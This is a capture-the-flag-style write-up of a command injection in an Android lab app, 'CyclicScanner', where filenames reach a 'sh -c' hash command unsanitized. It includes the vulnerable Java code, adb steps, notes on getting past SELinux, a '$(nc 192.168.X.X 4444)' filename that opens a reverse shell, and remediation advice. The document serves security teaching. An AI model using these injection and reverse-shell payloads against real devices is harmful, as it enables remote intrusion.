# CyclicScanner — Android Command Injection via Filename

**Category:** Android Exploitation  
**Tags:** `android` `command-injection` `service-exploitation` `SELinux` `reverse-shell`

---

## Overview

CyclicScanner is an Android app that runs a foreground `ScanService` which periodically walks `/sdcard/` and computes SHA1 hashes of every file using a shell command. The file path is passed unsanitized into a shell command, enabling command injection via a malicious filename.

---

## Recon

### Static Analysis (jadx)

Decompiled the APK and identified the following flow:

1. `MainActivity` — requires `MANAGE_ALL_FILES` permission, then presents a toggle switch
2. Toggle starts `ScanService` as a foreground service
3. `ScanService.handleMessage()` walks `/sdcard/` via `FileKt.walk()` and calls `ScanEngine.scanFile()` on each file
4. `ScanEngine.scanFile()` builds a shell command:

```java
String command = "toybox sha1sum " + file.getAbsolutePath();
Process process = new ProcessBuilder()
    .command("sh", "-c", command)
    .directory(Environment.getExternalStorageDirectory())
    .redirectErrorStream(true)
    .start();
```

**Vulnerability:** `file.getAbsolutePath()` is concatenated directly into a `sh -c` command with no sanitization. If the filename contains shell metacharacters like `$()`, they will be evaluated by `sh`.

---

## Exploitation

### Step 1 — Grant Permission & Start Service

```bash
# Grant MANAGE_EXTERNAL_STORAGE via settings
adb shell am start -a android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION \
  -d package:com.mobilehackinglab.cyclicscanner

# Launch app and toggle the switch to start ScanService
adb shell am start -n com.mobilehackinglab.cyclicscanner/.MainActivity
```

Confirm service is running:
```bash
adb logcat | grep -i "scan"
```

### Step 2 — Verify Command Injection

Push a file with a `$()` substitution as the filename:

```bash
adb push test.txt '/sdcard/$(whoami)'
```

Observe logcat — the path is passed literally to `sh -c`, confirming the injection point exists.

### Step 3 — Bypass Filesystem Restrictions

Special characters (`>`, `|`) are rejected by the filesystem in filenames. Scripts in `/data/local/tmp/` are blocked by SELinux (`shell_data_file` context). Scripts in the app's data dir (`app_data_file`) are blocked by `execute_no_trans`.

**Solution:** Use inline toybox commands inside `$()` — no script needed.

### Step 4 — Reverse Shell

Confirm `nc` is available (toybox built-in) and supports `COMMAND` argument syntax:

```
usage: netcat [-46ELlntUu] [-pqWw #] [-s addr] {IPADDR PORTNUM|COMMAND...}
```

Start listener on Fedora:
```bash
nc -lvnp 4444
```

Push malicious filename:
```bash
adb push test.txt '/sdcard/$(nc 192.168.X.X 4444)'
```


Connects back
~~~
(android-pentest-venv) vi@fedora:~$ nc -lvnp 4444 
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.1.X.
Ncat: Connection from 192.168.1.X:35880.
~~~

---

## Key Observations

| Finding | Detail |
|---|---|
| Vuln class | OS Command Injection |
| Sink | `ProcessBuilder.command("sh", "-c", ...)` |
| Source | `file.getAbsolutePath()` — attacker-controlled filename |
| Sanitization | None |
| SELinux | Blocks script execution; inline commands bypass this |
| Trigger | Service auto-scans `/sdcard/` on interval |

---

## Cleanup

```bash
adb shell
cd /sdcard
rm -rf '$('*
rm '$whoami'
rm 'test.txt'
rm 'script.sh'
```

---

## Remediation

- Sanitize or validate file paths before passing to shell commands
- Avoid `sh -c` with user-controlled input entirely — use `ProcessBuilder` with separate args:
  ```java
  new ProcessBuilder("toybox", "sha1sum", file.getAbsolutePath())
  ```
- This passes the path as a literal argument, not interpreted by a shell
